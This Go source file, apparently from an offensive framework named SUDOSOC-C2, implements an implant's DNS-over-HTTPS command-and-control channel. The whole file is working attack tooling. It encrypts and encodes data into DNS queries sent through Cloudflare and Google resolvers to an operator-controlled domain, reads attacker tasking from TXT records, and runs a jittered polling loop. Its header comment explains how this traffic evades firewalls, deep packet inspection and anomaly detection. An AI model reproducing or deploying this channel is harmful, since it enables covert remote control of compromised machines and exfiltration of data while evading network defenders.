package doh

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	DNS-over-HTTPS (DoH) C2 channel.

	Traffic disguise:
	  Every byte of C2 traffic looks like a normal HTTPS request to
	  Cloudflare (1.1.1.1) or Google (8.8.8.8) public DNS resolvers.
	  Network sensors see TLS to a CDN IP — indistinguishable from
	  a browser or OS doing DNS resolution.

	Protocol flow:
	  Implant → C2 (exfil / command request):
	    HTTPS GET https://1.1.1.1/dns-query?name=<encoded>&type=TXT
	    The query name carries the compressed+base32 payload.
	    Multiple queries are used for large payloads (fragmentation).

	  C2 → Implant (tasking / response):
	    TXT record values carry the compressed+base32 response.
	    Multiple TXT records carry multiple fragments.

	  The C2 operator controls a DNS authoritative server for the
	  base domain (e.g. t.c2.example.com). Sliver's C2 server answers
	  queries from the DoH resolver with crafted TXT records.

	Detection difficulty:
	  - All traffic is HTTPS to 1.1.1.1 or 8.8.8.8 → allowed by almost
	    every corporate firewall ("Cloudflare DNS over HTTPS")
	  - DPI cannot inspect content (TLS)
	  - The DNS query names look like random base32 — normal for DNSSEC,
	    DANE, or certificate transparency domain proofs
	  - Timing: the implant polls at random jittered intervals (not fixed)

	Limitations:
	  - Maximum ~141 bytes per DNS query (label length constraints)
	  - Latency: DoH has ~50-200ms RTT per query
	  - Rate: aggressive querying may trigger DNS anomaly detection
	  - The operator needs to control a DNS zone for the base domain

	Implementation notes:
	  - Uses net/http with custom TLS transport pinned to DoH server cert
	  - JSON wire format (application/dns-json) — simplest to parse
	  - Both Cloudflare and Google DoH support this format
*/

import (
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"strings"
	"time"

	// {{if .Config.Debug}}
	"log"
	// {{end}}
)

// DoHProvider describes a DNS-over-HTTPS upstream resolver.
type DoHProvider struct {
	Name     string
	URL      string // base URL for the DoH endpoint
	IP       string // pinned IP (to avoid DNS lookup for the resolver itself)
}

// Built-in providers (always available, legitimate traffic).
var (
	CloudflareDoH = DoHProvider{
		Name: "Cloudflare",
		URL:  "https://1.1.1.1/dns-query",
		IP:   "1.1.1.1",
	}
	GoogleDoH = DoHProvider{
		Name: "Google",
		URL:  "https://8.8.8.8/dns-query",
		IP:   "8.8.8.8",
	}
	Quad9DoH = DoHProvider{
		Name: "Quad9",
		URL:  "https://9.9.9.9:5053/dns-query",
		IP:   "9.9.9.9",
	}
)

// DoHC2Config holds the DoH C2 channel configuration.
type DoHC2Config struct {
	// Provider is the DoH resolver to use.
	Provider DoHProvider
	// BaseDomain is the DNS zone we control (e.g. "t.c2ops.net").
	BaseDomain string
	// SessionID is an 8-char random hex identifier for this implant session.
	SessionID string
	// PollInterval is the base check-in interval (jitter is added).
	PollInterval time.Duration
	// JitterPct is the percentage of random jitter to add (0-100).
	JitterPct int
}

// DoHC2 is the DNS-over-HTTPS C2 client.
type DoHC2 struct {
	cfg    *DoHC2Config
	client *http.Client
	seq    uint8
	rng    *rand.Rand
}

// dohResponse is the JSON wire format returned by DoH resolvers.
type dohResponse struct {
	Status int `json:"Status"`
	Answer []struct {
		Name string `json:"name"`
		Type int    `json:"type"`
		Data string `json:"data"`
	} `json:"Answer"`
}

// NewDoHC2 creates a new DoH C2 client.
func NewDoHC2(cfg *DoHC2Config) *DoHC2 {
	if cfg.PollInterval == 0 {
		cfg.PollInterval = 30 * time.Second
	}
	if cfg.JitterPct == 0 {
		cfg.JitterPct = 30
	}
	if cfg.SessionID == "" {
		cfg.SessionID = randomHex8()
	}

	// Build an HTTP client that talks directly to the DoH IP
	// without going through local DNS (avoids circular resolution).
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{
			ServerName: strings.Split(cfg.Provider.URL, "/")[2],
		},
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			// Override DNS: always connect to the provider's pinned IP.
			_, port, _ := net.SplitHostPort(addr)
			if port == "" {
				port = "443"
			}
			return (&net.Dialer{Timeout: 10 * time.Second}).
				DialContext(ctx, network, cfg.Provider.IP+":"+port)
		},
	}

	return &DoHC2{
		cfg:    cfg,
		client: &http.Client{Transport: transport, Timeout: 15 * time.Second},
		rng:    rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

// Send encodes payload and sends it to the C2 server via DoH queries.
// Returns the server's response (decoded from TXT records).
func (d *DoHC2) Send(ctx context.Context, payload []byte) ([]byte, error) {
	// XOR-encrypt with session key.
	encrypted := XORStream(payload, d.cfg.SessionID)

	// Encode into DNS labels.
	labels, err := Encode(encrypted)
	if err != nil {
		return nil, fmt.Errorf("encode: %w", err)
	}

	// Fragment across multiple queries if needed.
	var allTXT []string
	for fragStart := 0; fragStart < len(labels); fragStart += maxLabels {
		fragEnd := fragStart + maxLabels
		if fragEnd > len(labels) {
			fragEnd = len(labels)
		}
		frag := labels[fragStart:fragEnd]

		fqdn := BuildQueryFQDN(d.seq, d.cfg.SessionID, d.cfg.BaseDomain, frag)
		d.seq++

		txtRecords, err := d.queryTXT(ctx, fqdn)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[doh] query %s error: %v", fqdn, err)
			// {{end}}
			continue
		}
		allTXT = append(allTXT, txtRecords...)
	}

	if len(allTXT) == 0 {
		return nil, nil // no response (polling with no pending tasks)
	}

	// Reassemble TXT records into response.
	// TXT values are sorted by their fragment number prefix (first 2 chars = hex seq).
	responseLabels := extractDataFromTXT(allTXT)
	decoded, err := Decode(responseLabels)
	if err != nil {
		return nil, fmt.Errorf("decode response: %w", err)
	}
	return XORStream(decoded, d.cfg.SessionID), nil
}

// Poll sends a heartbeat to the C2 and returns any pending command.
func (d *DoHC2) Poll(ctx context.Context) ([]byte, error) {
	// Heartbeat payload: session ID + "POLL" marker.
	hb := []byte("POLL:" + d.cfg.SessionID)
	return d.Send(ctx, hb)
}

// RunLoop starts the polling loop. Commands received are sent to cmdCh.
// Responses to send back are received from respCh.
func (d *DoHC2) RunLoop(ctx context.Context, cmdCh chan<- []byte, respCh <-chan []byte) {
	for {
		select {
		case <-ctx.Done():
			return
		case <-time.After(d.jitteredInterval()):
		}

		// Check for pending task (send POLL query).
		cmd, err := d.Poll(ctx)
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[doh] poll error: %v", err)
			// {{end}}
			continue
		}
		if len(cmd) > 0 {
			select {
			case cmdCh <- cmd:
			default:
			}
		}

		// Send any pending response.
		select {
		case resp := <-respCh:
			if _, err := d.Send(ctx, resp); err != nil {
				// {{if .Config.Debug}}
				log.Printf("[doh] send response error: %v", err)
				// {{end}}
			}
		default:
		}
	}
}

// queryTXT sends a DoH query for TXT records at fqdn and returns the values.
func (d *DoHC2) queryTXT(ctx context.Context, fqdn string) ([]string, error) {
	req, err := http.NewRequestWithContext(ctx, "GET",
		d.cfg.Provider.URL+"?name="+fqdn+"&type=TXT", nil)
	if err != nil {
		return nil, err
	}
	req.Header.Set("Accept", "application/dns-json")

	resp, err := d.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(io.LimitReader(resp.Body, 65536))
	if err != nil {
		return nil, err
	}

	var dnsResp dohResponse
	if err := json.Unmarshal(body, &dnsResp); err != nil {
		return nil, err
	}
	if dnsResp.Status != 0 {
		return nil, nil // NXDOMAIN or other error — no pending task
	}

	var txts []string
	for _, ans := range dnsResp.Answer {
		if ans.Type == 16 { // TXT
			// TXT data comes with surrounding quotes — strip them.
			val := strings.Trim(ans.Data, `"`)
			txts = append(txts, val)
		}
	}
	return txts, nil
}

// jitteredInterval returns the poll interval with random jitter applied.
func (d *DoHC2) jitteredInterval() time.Duration {
	base := d.cfg.PollInterval
	jitterRange := float64(base) * float64(d.cfg.JitterPct) / 100.0
	jitter := time.Duration(d.rng.Float64() * jitterRange)
	if d.rng.Intn(2) == 0 {
		return base + jitter
	}
	return base - jitter
}

// extractDataFromTXT extracts and sorts the data labels from TXT records.
// Each TXT record has a 2-hex-char fragment sequence prefix.
func extractDataFromTXT(txts []string) []string {
	type fragEntry struct {
		seq  int
		data string
	}
	var frags []fragEntry
	for _, txt := range txts {
		if len(txt) < 3 {
			continue
		}
		var seq int
		fmt.Sscanf(txt[:2], "%x", &seq)
		frags = append(frags, fragEntry{seq, txt[2:]})
	}
	// Sort by seq.
	for i := range frags {
		for j := i + 1; j < len(frags); j++ {
			if frags[j].seq < frags[i].seq {
				frags[i], frags[j] = frags[j], frags[i]
			}
		}
	}
	labels := make([]string, len(frags))
	for i, f := range frags {
		labels[i] = f.data
	}
	return labels
}

func randomHex8() string {
	return fmt.Sprintf("%08x", rand.New(rand.NewSource(time.Now().UnixNano())).Uint32())
}
